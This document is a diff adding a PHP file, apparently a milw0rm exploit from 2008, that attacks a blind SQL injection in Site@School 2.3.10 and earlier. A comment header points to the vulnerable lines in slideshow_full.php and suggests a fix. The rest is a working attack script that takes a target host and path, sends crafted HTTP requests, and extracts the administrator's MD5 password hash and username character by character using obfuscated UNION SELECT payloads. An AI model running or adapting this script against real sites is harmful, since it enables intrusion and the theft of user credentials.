@@ -1,0 +1,176 @@
+<?
+
+/*
+	--------------------------------------------------------
+	Site@School <= 2.3.10 Remote Blind SQL Injection Exploit
+	--------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://
+	details..: works with magic_quotes_gpc = off
+
+	[-] Blind SQL Injection in /starnet/addons/slideshow_full.php :
+
+	128.	$query = "SELECT id, description, children FROM $allbum_table WHERE title = '" . $album_name . "'"; <==
+	129.	$result = mysql_query($query) or die(mysql_error() . $query);
+	130.	$RecordCount = mysql_num_rows($result);
+	131.	if ($RecordCount == 0)
+	132.	{
+	133.		print $sas_lang['sn_allbum_no_linkpage'];
+	134.	}
+	135.	else
+	136.	{
+	137.		$allbum_id = mysql_result($result, 0, 0);
+	138.		$allbum_descr = mysql_result($result, 0, 1);
+	139.		$sort_order = mysql_result($result, 0, 2);   // [third field of the first query]
+	140.		$sort_array = explode(",", $sort_order); [*]
+	141.	
+	142.		$query = "SELECT children FROM $allbum_table WHERE id='" . $allbum_id . "'"; 
+	143.		$result = mysql_query($query) or die(mysql_error() . $query);
+	144.		$children = mysql_result($result, 0);
+	145.		$children = explode(",", $children);
+	146.	
+	147.		$i = 1;
+	148.		$count = count($sort_array);
+	149.		foreach ($sort_array as $value)
+	150.		{
+	151.			$query = "SELECT path, thumb, description FROM $allbum_table WHERE id = '" . $value . "'"; <==
+	152.			$result = mysql_query($query) or die(mysql_error() . $query);
+	153.			$path = mysql_result($result, 0, 0);
+	154.			$thumb = mysql_result($result, 0, 1);
+	155.			$descr = mysql_result($result, 0, 2);
+	156.			print "\n<a id=\"photo_urls_$i\" href=\"../" . $path . "/" . $thumb . "\"></a>";
+	157.			$title[$i] = $descr;
+
+	$album_name parameter isn't properly checked, this results in a sql injection at line 128...an attacker could be
+	inject other sql code in the third filed of the query to results in another sql injection al line 151, but explode()
+	function at line 140 will split the injected code by comma (","), so this is only a blind sql injection!
+	
+	[-] To retrieve the table prefix see error at: http://[host]/[path]/starnet/addons/slideshow_full.php?album_name=' 
+
+	[*] Possible bug fix:
+
+	53.	if (IsSet ($_GET['album_name']))
+	54.	{
+	55.		$album_name = addslashes($_GET['album_name']);
+	56.		$album_name = htmlspecialchars(strip_tags($album_name)); //remove html tags
+	57.	}
+*/
+
+error_reporting(0);
+ini_set("default_socket_timeout",5);
+set_time_limit(0);
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...\n";
+		$sock = fsockopen($host,$port);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1);
+	fclose($sock);
+	return $resp;
+}
+
+function check_query($sql)
+{
+    global $host, $path;
+   
+    $packet  = "GET {$path}starnet/addons/slideshow_full.php?album_name={$sql} HTTP/1.0\r\n";
+    $packet .= "Host: {$host}\r\n";
+    $packet .= "Connection: close\r\n\r\n";
+    $html     = http_send($host, $packet);
+   
+    return preg_match("/<title>SlideShow<\/title>/", $html);
+}
+
+function check_target()
+{
+	global $host, $path;
+	
+	print "\n[-] Checking {$host}...";
+	
+	$packet  = "GET {$path}starnet/addons/slideshow_full.php?album_name=' HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	$html	 = http_send($host, $packet);
+	
+	if (preg_match("/'''/", $html)) print " OK!\n";
+	else die("\n\n[-] Exploit failed...probably magic_quotes_gpc = on\n");
+}
+
+print "\n+------------------------------------------------------------------+";
+print "\n| Site@School <= 2.3.10 Remote Blind SQL Injection Exploit by EgiX |";
+print "\n+------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage...: php $argv[0] host path [userid] [prefix]\n";
+	print "\nhost....: target server (ip/hostname)";
+	print "\npath....: path to sas directory";
+	print "\nuserid..: user id (default: 1 - admin)";
+	print "\nprefix..: table's prefix (default: sn)\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+$uid  = (isset($argv[3]) ? $argv[3] : "1");
+$pre  = (isset($argv[4]) ? $argv[4] : "sn");
+
+check_target();
+
+$hash = array(0, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102);
+$index = 1; $md5 = "";
+
+print "\n[-] MD5 Hash: ";
+
+while (!strpos($md5, chr(0)))
+{
+	for ($i = 0, $n = count($hash); $i <= $n; $i++)
+	{
+  		if ($i == $n) die("\n\n[-] Exploit failed...\n");
+
+		$sql =	"-1'/**/UNION/**/SELECT/**/password,1,1/**/FROM/**/{$pre}_users/**/WHERE/**/" .
+			"id={$uid}/**/AND/**/ORD(SUBSTR(password,{$index},1))={$hash[$i]}/*";
+
+		if (check_query($sql)) { $md5 .= chr($hash[$i]); print chr($hash[$i]); break; }
+	}
+
+	$index++;
+}
+
+$char = array(0); // null char
+for ($j = 97; $j <= 122; $j++) $char = array_merge($char, array($j)); // a-z
+for ($j = 65; $j <= 90; $j++) $char = array_merge($char, array($j)); // A-Z
+for ($j = 48; $j <= 57; $j++) $char = array_merge($char, array($j)); // 0-9
+
+$index = 1; $user = "";
+
+print "\n[-] Username: ";
+
+while (!strpos($user, chr(0)))
+{
+	for ($i = 0, $n = count($char); $i <= $n; $i++)
+	{
+  		if ($i == $n) die("\n\n[-] Exploit failed...\n");
+
+		$sql =	"-1'/**/UNION/**/SELECT/**/username,1,1/**/FROM/**/{$pre}_users/**/WHERE/**/" .
+			"id={$uid}/**/AND/**/ORD(SUBSTR(username,{$index},1))={$char[$i]}/*";
+
+		if (check_query($sql)) { $user .= chr($char[$i]); print chr($char[$i]); break; }
+	}
+
+	$index++;
+}
+
+print "\n\n[-] Successfull!\n";
+
+?>
+
+# milw0rm.com [2008-01-03]
